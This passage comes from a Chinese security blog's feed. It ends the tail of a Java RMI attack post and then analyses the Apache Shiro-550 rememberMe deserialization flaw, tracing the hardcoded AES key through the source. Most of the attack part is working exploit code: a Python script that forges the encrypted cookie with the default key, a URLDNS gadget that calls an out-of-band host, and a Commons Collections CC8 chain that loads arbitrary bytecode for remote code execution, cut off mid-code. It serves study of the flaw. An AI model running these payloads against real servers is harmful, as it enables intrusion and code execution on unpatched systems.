class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">        <span class="comment">// 1. get the stub of registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 2. get the stub of remote object</span></span><br><span class="line">        <span class="type">RemoteObjectInterface</span> <span class="variable">stub</span> <span class="operator">=</span> (RemoteObjectInterface) registry.lookup(<span class="string">&quot;remoteObject&quot;</span>);</span><br><span class="line">        <span class="comment">// 3. invoke the method of remote object</span></span><br><span class="line">        <span class="type">ExportObject</span> <span class="variable">exportObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExportObject</span>();</span><br><span class="line">        stub.vulnFunc(exportObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先运行HTTPServer启动代码，起一个codebase，然后运行Server端启动代码，再运行Client端启动代码<br>成功执行HTTPServer的恶意参数子类的静态代码块。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695173375232-078b872d-2b1a-4173-8db1-bc1aea7d36f3.png" alt="image.png"></p><h1 id="JEP290-绕过"><a href="#JEP290-绕过" class="headerlink" title="JEP290 绕过"></a>JEP290 绕过</h1><p><strong>TODO</strong></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>源码分析<br><a href="https://www.bilibili.com/video/BV1L3411a7ax">https://www.bilibili.com/video/BV1L3411a7ax</a><br><a href="https://su18.org/post/rmi-attack">https://su18.org/post/rmi-attack</a><br><a href="https://tttang.com/archive/1530/">https://tttang.com/archive/1530/</a><br><a href="https://xz.aliyun.com/t/9261">https://xz.aliyun.com/t/9261</a></p><p>攻击面<br><a href="https://paper.seebug.org/1091">https://paper.seebug.org/1091</a><br><a href="https://su18.org/post/rmi-attack">https://su18.org/post/rmi-attack</a><br><a href="https://goodapple.top/archives/520">https://goodapple.top/archives/520</a><br><a href="https://goodapple.top/archives/321">https://goodapple.top/archives/321</a><br><a href="https://myzxcg.com/2021/10/Java-RMI%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8">https://myzxcg.com/2021/10/Java-RMI%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8</a><br><a href="https://www.anquanke.com/post/id/257452">https://www.anquanke.com/post/id/257452</a><br><a href="https://xz.aliyun.com/t/7930">https://xz.aliyun.com/t/7930</a><br><a href="https://xz.aliyun.com/t/7932">https://xz.aliyun.com/t/7932</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;时间有限，目前只跟完了RMI的源码分析部分，攻击和绕过只有下周再来了。&lt;br&gt;不过跟源码也已经发现了一些有意思的反序列化点，也算是为后面学习</summary>
      
    
    
    
    
    <category term="Java" scheme="https://jaspersec.top/tags/Java/"/>
    
    <category term="RMI" scheme="https://jaspersec.top/tags/RMI/"/>
    
  </entry>
  
  <entry>
    <title>shiro550反序列化</title>
    <link href="https://jaspersec.top/posts/1790070300.html"/>
    <id>https://jaspersec.top/posts/1790070300.html</id>
    <published>2023-12-24T00:32:20.000Z</published>
    <updated>2025-03-31T22:09:47.228Z</updated>
    
    <content type="html"><![CDATA[<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.bilibili.com/video/BV1iF411b7bD">https://www.bilibili.com/video/BV1iF411b7bD</a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>搭环境看的这位师傅的，有图有步骤，爱了。<br><a href="https://fireline.fun/2021/05/21/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%B8%80)-Shiro550/">https://fireline.fun/2021/05/21/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%B8%80)-Shiro550/</a></p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>shiro550在hvv的时候就有所耳闻，每次看一个Java站都要看看有没有rememberMe<br>一句话说这个洞：就是rememberMe传了个经过AES加密+Base64的序列化字符串，但是Shiro里这个密钥是固定的，那我们用同样的密钥加密和Base64，传恶意的序列化字符串，后台反序列化就会被打了。</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693992080953-6b62c209-4e3b-4b03-96c1-bbdfecf0ac0f.png" alt="image.png"></p><h2 id="挖洞思路"><a href="#挖洞思路" class="headerlink" title="挖洞思路"></a>挖洞思路</h2><p>尝试复现漏洞发现者，最初发现这个洞时的思路。<br>首先，抓包看到Cookie里的rememberMe有一大串，一般来说不会有这么多，于是猜测可能是传了序列化的对象<br>idea里双击”shift”，搜索”cookie”，找到CookieRememberMeManager这个类</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693992887524-557ba65b-ed87-4f55-a704-ad2bd87bda38.png" alt="image.png"></p><p>然后发现有两个函数带了remember字样，很可能是要找的函数</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693993027704-1fe5d6b6-592d-4e58-ad3d-018237120d85.png" alt="image.png"></p><p>看注释，发现getRememberedSerializedIdentity是对Cookie里的rememberMe的值进行Base64解码的</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693993320541-821444e6-7d17-4934-b21c-91c109b8cfd4.png" alt="image.png"></p><p>我们的目的是探索这个字段是否可反序列化，接下来看谁调用了getRememberedSerializedIdentity，目的是看看base64解码之后，下一步是干什么。<br>这里可以看到，抽象父类的getRememberedPrincipals方法调了getRememberedSerializedIdentity</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693993460074-cb9159c9-eab2-422a-ab7f-fce86ad8cb65.png" alt="image.png"></p><p>继续看getRememberedSerializedIdentity，发现它把字符串base64decode后，把结果传到了convertBytesToPrincipals这个函数里</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693993648270-680fd33a-714f-4d78-b710-dc94bbd244ba.png" alt="image.png"></p><p>再跟进convertBytesToPrincipals这个函数，发现里边有个decrypt()函数，这显然是在对字符串解密<br>在字符串解密之后，直接传到deserialize()函数里，参与反序列化！<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693993682635-12e6390e-c231-49b8-966e-83d446e7293a.png" alt="image.png"><br>下面看它怎么解密的，跟进decrypt，注意到这里有个获取解密密钥的函数<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693996088166-7a0f4482-6860-49fb-bcca-bac1f4060f4f.png" alt="image.png"><br>跟进去getDecryptionCipherKey，他是直接返回AbstractRememberMeManager的decryptionCipherKey属性</p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693996362214-cbacfc97-1239-4c2f-98d4-2499091e1cce.png" alt="image.png" style="zoom:150%;" /><p>下面找找哪里给decryptionCipherKey赋值了，idea小技巧，”value write”里都是赋值函数<br>这里找到setDecryptionCipherKey()函数，它把传入的参数赋值给decryptionCipherKey，但是没写参数哪来的<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693997055979-52da1b14-24a8-4d88-8cd0-e8aab0d771bb.png" alt="image.png"><br>再找谁调用了setDecryptionCipherKey()，找到了setCipherKey()函数，这里还是没写参数哪来的<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693997415675-6e10db0f-0211-4675-882d-04c26d5bd3ea.png" alt="image.png"><br>再往上找，终于找到了，默认的密钥就是这个DEFAULT_CIPHER_KEY_BYTES<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693997502363-4a93b71c-4cba-4f29-8e24-4167ec69462a.png" alt="image.png"><br>看注释，可以看到Shiro在这里采用AES+Base64来加密我们序列化之后的字符串<br>问题也就出在这，他这里把对称加密的密钥写死了，知道密钥，AES加密就相当于没有<br>我们按照它的构造规则，先AES再Base64，就可以打它的反序列化了。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693997565433-9589bc80-6c1a-4df4-a756-ae68adc97e4e.png" alt="image.png"></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>根据组长的视频，讲了三种利用方式：</p><ul><li>URLDNS链：JDK自带，不需要依赖，但是只能SSRF，不能RCE</li><li>CC8链：CC2+CC6，需要用到Commons Collections3，能RCE</li><li>CB1链：Shiro自带CB依赖，能直接RCE</li></ul><p>cookie加密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># －*-* coding:utf-8</span></span><br><span class="line"><span class="comment"># @Time    :  2022/7/13 17:36</span></span><br><span class="line"><span class="comment"># @Author  : Drunkbaby</span></span><br><span class="line"><span class="comment"># @FileName: poc.py</span></span><br><span class="line"><span class="comment"># @Software: VSCode</span></span><br><span class="line"><span class="comment"># @Blog    ：https://drun1baby.github.io/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 同目录下放已经反序列化的文件object.ser，通过AES和BASE64加密生成rememberMe的cookie</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> email.mime <span class="keyword">import</span> base</span><br><span class="line"><span class="keyword">from</span> pydoc <span class="keyword">import</span> plain</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_data</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_enc</span>(<span class="params">data</span>):</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_dec</span>(<span class="params">enc_data</span>):</span><br><span class="line">    enc_data = base64.b64decode(enc_data)</span><br><span class="line">    unpad = <span class="keyword">lambda</span> s: s[:-s[-<span class="number">1</span>]]</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = enc_data[:<span class="number">16</span>]</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    plaintext = encryptor.decrypt(enc_data[<span class="number">16</span>:])</span><br><span class="line">    plaintext = unpad(plaintext)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    data = get_file_data(<span class="string">&quot;object.ser&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(aes_enc(data))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>这条链很短，跟过之前的链子，再回过头看真的很简单，这里直接上Exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        HashMap&lt;URL,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://fbuj4kl1p0zk9fwg0my69sta319sxold.oastify.com&quot;</span>);</span><br><span class="line">        setFieldValue(url,<span class="string">&quot;hashCode&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        hashMap.put(url,<span class="number">2</span>);</span><br><span class="line">        setFieldValue(url,<span class="string">&quot;hashCode&quot;</span>,-<span class="number">1</span>);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line"><span class="comment">//        unserialize();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(o);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="comment">//反序列化执行readObject()方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        fis.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>把生成的序列化字符串文件object.ser，放到cookie加密脚本同目录下，然后运行脚本生成cookie：<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693999017177-947cd84c-d1f3-4140-aea7-c728638989ad.png" alt="image.png"><br>burp抓包，更换rememberMe字段cookie，打过去，注意要删掉多余的JSESSIONID，这和代码流程有关<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693999283905-79aaf41a-aa36-42be-b5bf-3c3f06278df4.png" alt="image.png"><br>burp的collaborator模块，狂点Poll now，就能够接收到请求记录<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693999315175-cf6b5f5c-b38c-4fb4-8454-344710dfc4d4.png" alt="image.png"></p><h2 id="CC8"><a href="#CC8" class="headerlink" title="CC8"></a>CC8</h2><p>这个要加Commons Collections3的依赖，因为Shiro本身并不带Commons Collections3，test的不算</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693999853223-2530f8a9-dc3f-4f43-a174-62d3385d77f5.png" alt="image.png"></p><p>加了CC3的依赖，按理说应该每条CC3的链子我们都能打通，但是当我们尝试用CC6去打的时候会有以下报错<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694000222650-5772d7a6-6ff2-436a-99c4-26f235c121c7.png" alt="image.png"><br>意思是无法加载Transomer数组这个类，这意味着我们没办法用ChainedTransformer类了，而不用chainedTransformer数组的链子，很容易想到CC2的特点，代码执行+不用数组<br>尝试编写Exp如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCC8</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// CC2部分</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="comment">//设置变量，确保函数流程走通</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;jasper&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Codes\\Java\\javasec\\CC\\target\\classes\\pojo\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,codes);</span><br><span class="line">        <span class="comment">// _tfactory是，想提前调用链条的时候设置的；反序列化的会自己赋值，可以注释掉</span></span><br><span class="line"><span class="comment">//        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span></span><br><span class="line">        <span class="comment">//用invokerTransformer触发newTransformer = = </span></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">        <span class="comment">// invokerTransformer.transform();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(o);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="comment">//反序列化执行readObject()方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        fis.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样一来就没有用数组，另外把问题转化成调用xxx.transform()了，这里用CC6的后半段就好<br>注意： “key2”改成templates，chainedTransformer改成invokerTransformer<br>完整Exp如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCC8</span> &#123;</span><br><span class="line">    <span class="comment">// CC2+CC6 实现不使用Transform数组，并且代码执行</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// CC2</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="comment">//设置变量，确保函数流程走通</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;jasper&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Codes\\Java\\javasec\\CC\\target\\classes\\pojo\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,codes);</span><br><span class="line">        <span class="comment">// _tfactory是，想提前调用链条的时候设置的，反序列化的时候可以注释掉，它会在反序列化的时候自己赋值</span></span><br><span class="line"><span class="comment">//        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span></span><br><span class="line">        <span class="comment">// 用invokerTransformer触发newTransformer</span></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">        <span class="comment">// invokerTransformer.transform();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// CC6部分</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key1&quot;</span>,<span class="string">&quot;value1&quot;</span>);</span><br><span class="line">        <span class="comment">//修改链子，避免put的时候自己电脑老执行命令</span></span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"><span class="comment">//        lazyMap.get(&quot;Jasper&quot;);</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, templates);</span><br><span class="line"><span class="comment">//        tiedMapEntry.getValue();</span></span><br><span class="line"><span class="comment">//        tiedMapEntry.hashCode();</span></span><br><span class="line"><span class="comment">//        Class clazz = Class.forName(&quot;java.util.HashMap&quot;);</span></span><br><span class="line"><span class="comment">//        Method hashMethod = clazz.getDeclaredMethod(&quot;hash&quot;, Object.class);</span></span><br><span class="line"><span class="comment">//        hashMethod.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        hashMethod.invoke(clazz,tiedMapEntry);</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap1.put(tiedMapEntry,<span 